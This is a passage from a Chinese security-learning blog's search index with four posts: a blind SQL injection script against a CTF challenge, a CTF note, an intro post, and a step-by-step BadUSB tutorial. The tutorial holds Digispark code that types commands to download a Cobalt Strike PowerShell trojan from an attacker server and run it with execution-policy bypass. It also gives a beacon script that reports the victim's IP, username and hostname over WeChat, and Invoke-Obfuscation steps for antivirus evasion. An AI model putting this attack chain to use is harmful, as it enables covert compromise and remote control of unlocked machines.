class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import graph_output</span><br><span class="line">import time</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">def sql():</span><br><span class="line">    #爆总数</span><br><span class="line">    #payload1=&quot;0||(select/**/1)=%d#&quot;</span><br><span class="line">    #payload1=&quot;0||(select/**/count(schema_name)/**/from/**/information_schema.schemata)=%d#&quot;</span><br><span class="line">    #payload1=&#x27;0||(select/**/count(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web8&quot;)=%d#&#x27;</span><br><span class="line">    #payload1=&#x27;0||(select/**/count(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;)=%d#&#x27;</span><br><span class="line">    payload1=&quot;0||(select/**/count(flag)/**/from/**/web8.flag)=%d#&quot;</span><br><span class="line"></span><br><span class="line">    for i in range(100):</span><br><span class="line">        payload=payload1 % i</span><br><span class="line">        print(payload)</span><br><span class="line">        if execute(payload):</span><br><span class="line">            num=i</span><br><span class="line">            print(&#x27;共查询到%d条记录&#x27; % i)</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;记录数量过多，请增加范围！&#x27;)</span><br><span class="line">        print(&#x27;程序将继续爆破前10条记录&#x27;)</span><br><span class="line">        num=10;     #挑前10条记录继续爆破</span><br><span class="line"></span><br><span class="line">    #column_name_list=[&#x27;database_name&#x27;]</span><br><span class="line">    #column_name_list=[&#x27;table_name&#x27;]</span><br><span class="line">    #column_name_list=[&#x27;column_name&#x27;]</span><br><span class="line">    column_name_list=[&#x27;rid-rpw-name&#x27;]</span><br><span class="line">    record_list=[]</span><br><span class="line">    name_space = [0]</span><br><span class="line">    name_space.extend(list(range(32, 97)))</span><br><span class="line">    name_space.extend(list(range(97, 127)))</span><br><span class="line"></span><br><span class="line">    #payload2=&quot;0||ascii(mid((select/**/database()/**/limit/**/2/**/offset/**/%d)/**/from/**/%d/**/for/**/1))&gt;%d#&quot;</span><br><span class="line">    #payload2=&quot;0||ascii(mid((select/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/1/**/offset/**/%d)/**/from/**/%d/**/for/**/1))&gt;%d#&quot;</span><br><span class="line">    #payload2=&#x27;0||ascii(mid((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web8&quot;/**/limit/**/1/**/offset/**/%d)/**/from/**/%d/**/for/**/1))&gt;%d#&#x27;</span><br><span class="line">    #payload2=&#x27;0||ascii(mid((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;/**/limit/**/1/**/offset/**/%d)/**/from/**/%d/**/for/**/1))&gt;%d#&#x27;</span><br><span class="line">    payload2=&quot;0||ascii(mid((select/**/flag/**/from/**/flag/**/limit/**/1/**/offset/**/%d)/**/from/**/%d/**/for/**/1))&gt;%d#&quot;</span><br><span class="line">    for i in range(num):</span><br><span class="line">        string=&#x27;&#x27;</span><br><span class="line">        index=1</span><br><span class="line">        while True:</span><br><span class="line">            asc=9999</span><br><span class="line">            left = 0</span><br><span class="line">            right = len(name_space) - 1</span><br><span class="line">            # 二分法</span><br><span class="line">            while left&lt;right:</span><br><span class="line">                mid = (left + right) // 2</span><br><span class="line">                payload=payload2 % (i,index,name_space[mid])</span><br><span class="line">                print(payload)</span><br><span class="line">                if execute(payload):</span><br><span class="line">                    left=mid+1</span><br><span class="line">                else:</span><br><span class="line">                    right=mid</span><br><span class="line">                # 结束二分，若最后left不等于right，则大于left则是right，若不大于left，则必然是left本身</span><br><span class="line">                if left==right-1:</span><br><span class="line">                    payload=payload2 % (i,index,name_space[left])</span><br><span class="line">                    print(payload)</span><br><span class="line">                    if execute(payload):</span><br><span class="line">                        asc=name_space[right]</span><br><span class="line">                        break</span><br><span class="line">                    else:</span><br><span class="line">                        asc=name_space[left]</span><br><span class="line">                        break</span><br><span class="line">                elif left==right:</span><br><span class="line">                    asc=name_space[left]</span><br><span class="line">                    break</span><br><span class="line">            if asc==0:</span><br><span class="line">                print(string)</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(string)</span><br><span class="line">                record_list.append(temp)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                print(chr(asc))</span><br><span class="line">                string += chr(asc)</span><br><span class="line">                index+=1</span><br><span class="line"></span><br><span class="line">    graph_output.handler(column_name_list, record_list)</span><br><span class="line"></span><br><span class="line">def execute(payload):</span><br><span class="line">    #执行payload</span><br><span class="line">    headers=&#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&#x27;&#125;</span><br><span class="line">    link = &#x27;http://3b7a2472-a12c-4dcb-aae4-989e7242bbf3.challenge.ctf.show/index.php?id=&#x27;+payload</span><br><span class="line">    while 1:</span><br><span class="line">        try:</span><br><span class="line">            r=requests.get(link,headers=headers,timeout=3)</span><br><span class="line">            print(r.status_code)</span><br><span class="line">            #soup = BeautifulSoup(r.text, &#x27;html.parser&#x27;)</span><br><span class="line">            #print(soup.find_all(attrs=&#123;&#x27;bgcolor&#x27;: &#x27;#FFFFEC&#x27;&#125;))</span><br><span class="line">            if &#x27;if&#x27; in r.text:</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                return False</span><br><span class="line">            break</span><br><span class="line">        except Exception:</span><br><span class="line">            print(&#x27;Error!&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    # 登录</span><br><span class="line">    sql()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 1.CTF </category>
          
          <category> 1.日常练习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>其他题型</title>
      <link href="/2021/10/28/%E5%85%B6%E4%BB%96%E9%A2%98%E5%9E%8B/"/>
      <url>/2021/10/28/%E5%85%B6%E4%BB%96%E9%A2%98%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h5 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h5><p>信息隐藏</p><h5 id="链接1"><a href="#链接1" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web签到题</p><h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><p>源代码隐藏flag的Base64编码，解码得flag</p><span id="more"></span><hr>]]></content>
      
      
      <categories>
          
          <category> 1.CTF </category>
          
          <category> 1.日常练习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BadUsb配合CobaltStrike4.0上线</title>
      <link href="/2021/09/06/BadUsb%E9%85%8D%E5%90%88CobaltStrike4.0%E4%B8%8A%E7%BA%BF/"/>
      <url>/2021/09/06/BadUsb%E9%85%8D%E5%90%88CobaltStrike4.0%E4%B8%8A%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="BadUsb配合CobaltStrike4-0上线"><a href="#BadUsb配合CobaltStrike4-0上线" class="headerlink" title="BadUsb配合CobaltStrike4.0上线"></a>BadUsb配合CobaltStrike4.0上线</h1><h2 id="0，实验概述"><a href="#0，实验概述" class="headerlink" title="0，实验概述"></a>0，实验概述</h2><p>参考资料：<a href="https://blog.csdn.net/m0_49605975/article/details/109248406">https://blog.csdn.net/m0_49605975/article/details/109248406</a></p><p>硬件材料：淘宝购Digispark （Attiny85）开发板（橡皮鸭rubber ducky经典版）</p><p>虚拟环境：云服务器一台（搭建CS服务端，开放web服务供靶机下载木马），任意联网靶机（Win7、Win10），Arduino编程软件，CobaltStrike4.0（后文简称CS4）破解版，Digispark（Attiny89）开发板驱动</p><p>思路总结：网购Digispark开发板，使用arduino烧录攻击代码，插入靶机模拟键盘操作打开Win+R，自动输入命令，最小化cmd，调用powershell远程下载云服务器上的木马并执行，关闭cmd窗口化进程，使其后台执行。</p><span id="more"></span><h2 id="1，CS4环境部署"><a href="#1，CS4环境部署" class="headerlink" title="1，CS4环境部署"></a>1，CS4环境部署</h2><h3 id="部署CS4服务端"><a href="#部署CS4服务端" class="headerlink" title="部署CS4服务端"></a>部署CS4服务端</h3><p>上传CS4到云服务器。</p><p>进入CS4目录，先给执行文件teamserver足够的权限：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">777</span> ./teamserver</span><br></pre></td></tr></table></figure><p>再设置参数来开启CS4服务。但由于需要服务一直在后台启动，所以使用screen命令。</p><p>screen下载（CentOS）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install screen -y</span><br></pre></td></tr></table></figure><p>然后打开一个新的screen窗口，在里面运行CS4服务，命令如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">screen-S cs4<span class="comment">//打开新窗口，并命名为cs4</span></span><br><span class="line">cd CS4目录<span class="comment">//在新窗口跳转到CS4所在目录</span></span><br><span class="line">./teamserver vps的ip地址 连接密码<span class="comment">//开CS4服务</span></span><br><span class="line">Ctrl+a，松开，再按d。<span class="comment">//切换回主界面。</span></span><br></pre></td></tr></table></figure><p>这样CS4服务就部署完了，即使会话关闭，这个服务也会再后台一直存在，除非用kill命令杀掉它。如果要重新进入这个会话：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screen -R cs4</span><br><span class="line"><span class="built_in">exit</span><span class="comment">//这个会话会彻底注销。</span></span><br></pre></td></tr></table></figure><p>由于我部署在腾讯云服务器上，所以需要在云防护上给端口放行，云防护默认是开放所有出端口，开放部分入端口的。我们需要先开放CS服务端口50050，供客户端连接：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20210909160756846.png" alt="image-20210909160756846"></p><p>PS：这里我用的是轻量应用服务器，云服务器的云防护配置方法自行查找，教程网上到处都是，并不难找。</p><h3 id="部署CS4客户端"><a href="#部署CS4客户端" class="headerlink" title="部署CS4客户端"></a>部署CS4客户端</h3><p>打开CS4文件夹，双击start.bat，在登陆框中输入登陆信息：</p><p>主机写VPS的IP地址，端口默认50050，用户名随便输，密码是之前部署CS4服务端时输的密码，要对应，不然登不上：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20210909160855067.png" alt="image-20210909160855067"></p><p>然后创建一个监听器：菜单栏Cobalt Strike–&gt;监听器–&gt;Add：</p><p>名字随便起；HTTP Hosts右边点”+”号，一般默认就是你云服务器的地址，直接确定就好；HTTP Port（C2）设置一个你云服务器不用的端口，建议10000以上，不容易跟已有端口冲突，一旦冲突服务就起不来了；其他一切选项保持默认。</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20210909161051520.png" alt="image-20210909161051520"></p><p>然后再在云防护上给这个端口放行，步骤和之前一样，这里我设置是4445，你们可以改成自定的（建议10000以上，端口冲突这个坑我是踩过的），总之保持CS4客户端监听器端口与云防护放行那个端口一致就可以了：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20210909161138089.png" alt="image-20210909161138089"></p><p>接着生成一个powershell木马，一会儿要用：</p><p>菜单栏 攻击–&gt;生成后门–&gt;Payload Generator</p><p>弹框中监听器选择刚才设置那个；输出下拉选择Powershell，x64选不选取决于你目标的系统是不是64位系统。最后点Generate生成木马，选择一个存放地址就可以得到一个.ps1后缀的木马文件了。</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20210909161231818.png" alt="image-20210909161231818"></p><p>做到这一步就可以使用该木马配合CS4进行攻击了，只需要在任意安装了powershell且无防护的机器上（win7、win10自带powershell）运行生成的木马，就可以看到CS4客户端目标机器的上线信息了，也即获得了目标机器的shell权限。</p><h3 id="将木马上传到云服务器备用"><a href="#将木马上传到云服务器备用" class="headerlink" title="将木马上传到云服务器备用"></a>将木马上传到云服务器备用</h3><p>在云服务器上安装httpd服务，并将木马上传到默认的网站根目录：&#x2F;var&#x2F;www&#x2F;html&#x2F;下，网页访问试试能不能下载到，之后会通过badusb的脚本来访问这个链接：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20210909161314586.png" alt="image-20210909161314586"></p><p>由于badusb脚本遇到中文输入法会出错，所以我在脚本里添加了切换大小写的代码，会将输入法切换成大写，并循环执行脚本，这样总有一次能绕过输入法让靶机中招。所以对于木马，最好也复制两份，一份名字是大写，一份是小写，比如：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20210909161400740.png" alt="image-20210909161400740"></p><p>PS：木马不使用P64.ps1后缀也是可以运行的，你通过网页访问木马很容易就能发现，木马最终下载下来是文本的格式，所以改成p64、P64等名字，也不会影响木马执行，反而由于取消了ps1后缀，更不易被杀软检测到。</p><p>PPS：httpd服务默认端口80在腾讯云上是默认放行的，但保险起见，各位还是登入云服务器检查一下。</p><h2 id="2，badusb烧录"><a href="#2，badusb烧录" class="headerlink" title="2，badusb烧录"></a>2，badusb烧录</h2><h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><p>烧录前需要准备两个软件：Arduino软件、Digispark （Attiny85）开发板驱动。</p><p>Arduino可以去官网免费下载：<a href="https://www.arduino.cc/en/donate/">https://www.arduino.cc/en/donate/</a></p><p>驱动下载：<a href="https://github.com/digistump/DigistumpArduino/blob/master/tools/micronucleus-2.0a4-win.zip">https://github.com/digistump/DigistumpArduino/blob/master/tools/micronucleus-2.0a4-win.zip</a></p><p>将驱动解压，选择文件夹中的DPinst.exe或DPinst64.exe双击运行，这取决于你自己的机器是32位还是64位：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20210909161506051.png" alt="image-20210909161506051"></p><h3 id="烧录脚本"><a href="#烧录脚本" class="headerlink" title="烧录脚本"></a>烧录脚本</h3><p>打开arduino，就可以设计badusb插入后要执行的程序了，这块在学习中能了解到，是一块很庞大的知识，利用好了能产生无限可能。想想就相当于badusb插入靶机后，你就在靶机里获得了一个虚拟键盘和鼠标的权限，想开什么端口，反弹shell，或是关掉杀毒软件，防火墙等等，都可以通过编程实现。</p><p>但这次我的目的只是制作一个能配合CS4上线的badusb玩具，所以仅限于反弹shell方面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;DigiKeyboard.h&quot;</span><br><span class="line">#define KEY_ESC     41</span><br><span class="line">#define KEY_BACKSPACE 42</span><br><span class="line">#define KEY_TAB     43</span><br><span class="line">#define KEY_PRT_SCR 70</span><br><span class="line">#define KEY_DELETE  76</span><br><span class="line">#define KEY_CAPS_LOCK 0x39</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line">DigiKeyboard.delay(3000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //win+R</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);  //大小写转换绕过中文输入法</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.println(&quot;CMD /t:01 /k @ECHO OFF &amp;&amp; MODE CON:cols=15 lines=1&quot;);  //最小化cmd窗口</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);  //回车</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.println(&quot;mkdir C:\\test&quot;); //C盘创建一个test目录</span><br><span class="line">DigiKeyboard.delay(1000);  </span><br><span class="line">DigiKeyboard.println(&quot;powershell&quot;);  </span><br><span class="line">DigiKeyboard.println(&quot;$clnt = new-object system.net.webclient;&quot;);</span><br><span class="line">DigiKeyboard.println(&quot;$url= &#x27;http://xxx.xxx.xxx.xxx/p64&#x27;;&quot;);</span><br><span class="line">DigiKeyboard.println(&quot;$file = &#x27;c:\\test\\b.ps1&#x27;;&quot;);</span><br><span class="line">DigiKeyboard.println(&quot;$clnt.downloadfile($url,$file)&quot;);   //分段执行，绕过防火墙进程保护，从云端下载木马到本地C盘test目录，并命名为b.ps1</span><br><span class="line">DigiKeyboard.println(&quot;powershell.exe -executionpolicy bypass -file c:\\test\\b.ps1&quot;);   //本地权限绕过执行木马</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //win+R</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.println(&quot;taskkill /t /im conhost.exe /f&quot;);  //关闭cmd的宿主程序，即图形界面</span><br><span class="line">&#125;</span><br><span class="line">void loop() &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译没问题后，点击右箭头烧录，然后在60s内将U盘插入，等待提示烧录成功即可：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20210909161627879.png" alt="image-20210909161627879"></p><p>以上步骤都完成之后，一个badusb配合CS4上线的攻击方式就完成了，只要将badusb插入任意未锁屏的机器，模拟按键的脚本就会在10s内运行，从云服务器下载木马并执行，将shell乖乖递给云端的CS4服务器。</p><h2 id="3，CS4微信上线提示"><a href="#3，CS4微信上线提示" class="headerlink" title="3，CS4微信上线提示"></a>3，CS4微信上线提示</h2><p>考虑到带USB的智能服务机这类测试对象，有可能出现即使上线，也依旧无任何回显的情况，所以做一个依据CS4服务端上线信息的微信提示。</p><p>参考资料：<a href="https://www.cnblogs.com/trevain/p/13693215.html">https://www.cnblogs.com/trevain/p/13693215.html</a></p><p>访问Server酱<a href="https://sct.ftqq.com/">https://sct.ftqq.com/</a></p><p>直接用微信扫码关注公众号就可以登陆，然后Server酱就会给你生成一个SendKey，用这个东西配合以下脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">循环获取所有beacon</span></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"></span><br><span class="line">    sub http_get &#123;</span><br><span class="line">        local(&#x27;$output&#x27;);</span><br><span class="line">        $url = [new java.net.URL: $1];</span><br><span class="line">        $stream = [$url openStream];</span><br><span class="line">        $handle = [SleepUtils getIOHandle: $stream, $null];</span><br><span class="line"></span><br><span class="line">        @content = readAll($handle);</span><br><span class="line"></span><br><span class="line">        foreach $line (@content) &#123;</span><br><span class="line">            $output .= $line . &quot;\r\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        println($output);</span><br><span class="line">    &#125;</span><br><span class="line">    #获取ip、计算机名、登录账号</span><br><span class="line">    $externalIP = replace(beacon_info($1, &quot;external&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $internalIP = replace(beacon_info($1, &quot;internal&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $userName = replace(beacon_info($1, &quot;user&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $computerName = replace(beacon_info($1, &quot;computer&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line"></span><br><span class="line">    #get一下Server酱的链接</span><br><span class="line">    $url = &#x27;https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&amp;desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0A%e5%a4%96%e7%bd%91ip:&#x27;.$externalIP.&#x27;%0D%0A%0D%0A%e5%86%85%e7%bd%91ip:&#x27;.$internalIP.&#x27;%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:&#x27;.$userName.&#x27;%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:&#x27;.$computerName;</span><br><span class="line"></span><br><span class="line">    http_get($url);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在以上代码填写好自己的SendKey之后，保存为weixinNotice.cna文件，上传到云服务器的CS4根目录，在CS4服务端开启的情况下（如果没开启自行开启后再下一步）使用下列命令，开启微信提醒脚本并在后台保持运行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">screen -S cs4-notice</span><br><span class="line">./agscript xxx.xxx.xxx.xxx <span class="number">50050</span> 用户名 密码 weixinNotice.cna</span><br><span class="line">Ctrl+a，松开，再按d<span class="comment">//会话后台运行</span></span><br></pre></td></tr></table></figure><p>然后在你shell上线后，就可以收到Server酱发给你的微信消息啦：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20210909161729765.png" alt="image-20210909161729765"></p><h2 id="4，木马免杀"><a href="#4，木马免杀" class="headerlink" title="4，木马免杀"></a>4，木马免杀</h2><p>免杀以火绒为主要对象。</p><p>说白了就是要模糊木马中的特征，这里用到一个工具：Invoke-Obfuscation-master。</p><p>下载地址：<a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p><p>使用该工具，对先前生成的木马进行免杀，具体步骤为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1，关闭杀毒软件</span><br><span class="line">2，管理员权限打开Powershell</span><br><span class="line">2，Set-ExecutionPolicy Unrestricted -Scope CurrentUser//修改Powershell配置，使其允许运行脚本。</span><br><span class="line">3,cd到Invoke-Obfuscation所在目录</span><br><span class="line">4，Import-Module ./Invoke-Obfuscation.psd1//导入模块</span><br><span class="line">5，Invoke-Obfuscation//运行工具</span><br><span class="line">6，set scriptpath 需免杀木马所在绝对路径//设置需免杀木马所在位置</span><br><span class="line">7，encoding//选择encoding模式进行免杀</span><br><span class="line">8，由1-8编号，在8种免杀方法种选择一种</span><br><span class="line">9，out 1.ps1//输出免杀木马到指定目录......输出完后可以再输编号，用其他方法进行免杀，8种全试一遍，总有一种能免杀的，推荐从第8种往前试。</span><br><span class="line">10，exit//退出工具</span><br><span class="line">11，Set-ExecutionPolicy RemoteSigned -Scope CurrentUser//还原电脑配置，禁止脚本执行。</span><br></pre></td></tr></table></figure><p>使用各种杀毒软件，对免杀后的木马进行测试，将能通过的测试的木马，上传到服务器替换非免杀木马即可。</p><h2 id="5，最后总结"><a href="#5，最后总结" class="headerlink" title="5，最后总结"></a>5，最后总结</h2><p>360免杀还存在问题，Invoke-PSImage虽然能够免杀，但配合badusb使用成效时间要按分钟计，太慢了。而且代码量太大，超出了Digispark的可容纳范围，导致只能削减cmd窗口最小化功能。目前还不能实战。</p><p>还有另一种360免杀办法，学自B站UP：Yihsiwei_啊渣。但需要在内网，控一台windows主机，开net share。然后用copy的方法使文件落地，我现在暂时用不到（打不到内网，太菜了）。</p><p>综上，以后再补充吧。</p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 1.近源攻击 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/2021/08/26/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/08/26/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>写一下建博客的原因吧。</p><p>首先，就是对知识做一个总结，我的目标是从信息收集，到外围渗透，再到内网穿透等等建立一个完整的测试体系，做到拿到任何一个系统都有方法可循。</p><p>我写下的每一篇博客都不能说已经是固定的，在某一天，我对某个知识点的理解更上一层楼的时候，我会抽出时间来更新这个知识点对应的博客。当然，最终的目的是对该知识点，或者说该漏洞，有一个全面的诠释以及清楚明了的测试办法。打个比方，这个漏洞应该怎么测，测出来了确实存在了又怎么利用，利用过程中遇到防护软件了又如何过WAF，或是免杀，等等等等。</p><p>其次，对知识做一个记录，我肯定没办法把所有漏洞的信息都记住，也没法知道所有工具的用法参数，这个时候就是好记性不如烂笔头，博客会起到一个笔记的作用，没有比遇到忘记的命令时打开公网的个人博客更方便的事情了。</p><p>最后，黑客的精髓是资源共享嘛，虽然我自觉目前的水平总结出的知识帮不了别人太多，但态度还是要有的。</p><p>以上，有新的理由再来更新这篇博客吧。。。</p>]]></content>
      
      
      <categories>
          
          <category> 0.序言 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
